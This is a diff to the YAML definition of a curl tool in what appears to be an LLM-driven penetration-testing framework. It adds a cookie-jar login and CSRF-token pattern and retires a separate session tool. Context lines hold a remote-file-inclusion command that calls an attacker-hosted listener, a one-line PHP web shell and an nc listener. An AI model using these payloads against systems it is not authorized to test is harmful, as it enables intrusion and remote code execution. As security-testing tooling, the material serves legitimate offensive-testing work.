@@ -2,7 +2,7 @@ name: curl
 kind: cli
 binary: curl
 version: "7.88.1"
-description: "HTTP/HTTPS/FTP client with HTTP/2, HTTP/3, NTLM, Kerberos, and TLS 1.3 support. The Swiss Army knife for web-layer pentesting: send arbitrary requests with custom methods/headers/bodies, deliver RCE payloads, upload web shells via multipart, download files (text or binary). Supports cookies, auth (basic/digest/NTLM/negotiate), redirect following, proxy chains, SSL bypass, certificate auth, and per-step timing instrumentation. The native CLI; LLM constructs the full curl invocation. Use playwright for JavaScript-rendered pages or web-session for stateful login flows."
+description: "HTTP/HTTPS/FTP client with HTTP/2, HTTP/3, NTLM, Kerberos, and TLS 1.3 support. The Swiss Army knife for web-layer pentesting: send arbitrary requests with custom methods/headers/bodies, deliver RCE payloads, upload web shells via multipart, download files (text or binary). Supports cookies, auth (basic/digest/NTLM/negotiate), redirect following, proxy chains, SSL bypass, certificate auth, and per-step timing instrumentation. The native CLI; LLM constructs the full curl invocation. Use playwright for JavaScript-rendered pages; for stateful login flows curl is itself the answer — drive a login with `-c` to write a cookie jar, then `-b` it back on subsequent calls."
 image: "ghcr.io/silicon-works/mcp-tools-curl:latest"
 image_size_mb: 100
 # Dual-clock model:
@@ -47,7 +47,6 @@ routing:
   never_use_for:
     - "directory or parameter brute-forcing — use ffuf"
     - "rendering JavaScript-heavy pages — use playwright"
-    - "stateful multi-request login flows — use web-session"
     - "automated vulnerability scanning — use nuclei or zap"
     - "cracking HTTP basic auth via wordlist — use hydra"
   triggers:
@@ -77,8 +76,6 @@ resources:
   cpu: 0.25
 
 see_also:
-  - tool: web-session
-    reason: "For stateful authenticated multi-request flows requiring cookie persistence"
   - tool: playwright
     reason: "For JavaScript-rendered pages or DOM interaction"
   - tool: ffuf
@@ -210,6 +207,10 @@ usage_patterns:
   - name: "RFI via attacker-hosted payload + callback listener (replaces retired lfi-rfi test_rfi)"
     command: "curl -sS -o {output} '{url}?{param}=http://{listener_ip}:{listener_port}/shell.txt'"
     when: "CORRECT RFI verification: point the include parameter at an attacker-controlled URL and confirm via a listener that ACTUALLY RECEIVED the request — NOT by inspecting the response body. Run the listener first (nc -lvnp {port}, python3 -m http.server, or tools/responder) hosting shell.txt = '<?php system($_GET[\"c\"]); ?>'. Listener logs a hit → RFI confirmed + PHP executed server-side. The retired lfi-rfi test_rfi used `status==200 and len(body)>0` which produces false positives — this listener method is the accurate technique. RFI requires allow_url_include=On (PHP). When remote-URL fetch is filtered, data:// is the LFI-side alternative: ?{param}=data://text/plain;base64,<b64-of-php>"
+
+  - name: "Authenticated session flow via persistent cookie jar (replaces retired web-session)"
+    command: "curl -skL -c /session/cookies/{name}.txt -d '{login_form_body}' '{login_url}' && curl -skL -b /session/cookies/{name}.txt -c /session/cookies/{name}.txt -o {output} '{protected_url}'"
+    when: "Stateful login then reuse the session — the role web-session used to fill. Call 1 posts the form (-d 'username=admin&password=pass'; use --data-urlencode for values with special chars); -c writes Set-Cookie into a Netscape jar under /session/cookies/. -L follows the post-login redirect (logins almost always 302 to a dashboard; without -L you miss the landing page and any cookie set on the redirect — web-session's urllib followed redirects by default). -k ignores TLS cert errors (web-session did ssl.CERT_NONE by default — pentest targets routinely have self-signed/expired certs). Reuse calls pass BOTH -b jar -c jar so a rotated/upgraded post-login session cookie is written back (web-session auto-merged new Set-Cookie on every request; a bare -b would pin a stale pre-auth session id). The jar feeds curl's own -b directly; OTHER tools want the cookie STRING not the jar file — derive it: awk 'NF>=7{printf \"%s=%s; \",$6,$7}' /session/cookies/{name}.txt then feed ffuf -b / sqlmap --cookie / nuclei -H 'Cookie: ...' (nikto -id is HTTP basic-auth, a separate mechanism). CSRF: fetch the form and grep the token in one shot — `curl -skL -b jar -c jar URL | grep -oP 'name=\"csrf_token\" value=\"\\K[^\"]+'` — then put it in the next -d body, keeping -b/-c on the same jar so cookie+token stay paired. Common token variants web-session matched: Django name=\"csrfmiddlewaretoken\", <meta name=\"csrf-token\" content=\"...\">, JSON \"csrf_token\":\"...\", and reversed value=\"...\" ... name=\"csrf...\" attribute order — adjust the regex per target. For JavaScript-rendered / OAuth / MFA logins curl cannot execute (no JS engine) — use playwright, then export its cookies into a jar."
 
 output_formats:
   - flag: "-o {path}"
